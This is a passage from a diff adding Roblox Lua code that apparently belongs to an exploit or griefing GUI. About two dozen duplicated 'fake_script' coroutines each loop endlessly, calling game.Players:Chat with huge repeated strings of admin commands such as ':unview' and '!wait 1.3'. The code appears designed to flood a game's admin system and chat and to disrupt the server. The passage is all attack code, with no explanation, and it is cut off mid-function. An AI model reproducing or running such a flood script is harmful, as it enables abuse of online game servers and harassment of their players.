+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(VXRVYJM_fake_script)()
+local function CEDM_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(CEDM_fake_script)()
+local function GCIV_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(GCIV_fake_script)()
+local function RXOFKYN_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(RXOFKYN_fake_script)()
+local function PCZBLJY_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PCZBLJY_fake_script)()
+local function GGCKGH_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(GGCKGH_fake_script)()
+local function YOYRNV_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(YOYRNV_fake_script)()
+local function XPWIP_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(XPWIP_fake_script)()
+local function XPTKTU_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(XPTKTU_fake_script)()
+local function QQVCO_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(QQVCO_fake_script)()
+local function GPCYCV_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(GPCYCV_fake_script)()
+local function OHYDR_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(OHYDR_fake_script)()
+local function QILER_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(QILER_fake_script)()
+local function TRXGJGN_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(TRXGJGN_fake_script)()
+local function SBEFN_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(SBEFN_fake_script)()
+local function TENZ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(TENZ_fake_script)()
+local function QOPL_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(QOPL_fake_script)()
+local function HQHU_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(HQHU_fake_script)()
+local function TKYKE_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(TKYKE_fake_script)()
+local function PQZRIUD_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PQZRIUD_fake_script)()
+local function WVUPE_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(WVUPE_fake_script)()
+local function DBBH_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(DBBH_fake_script)()
+local function YIYSZI_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
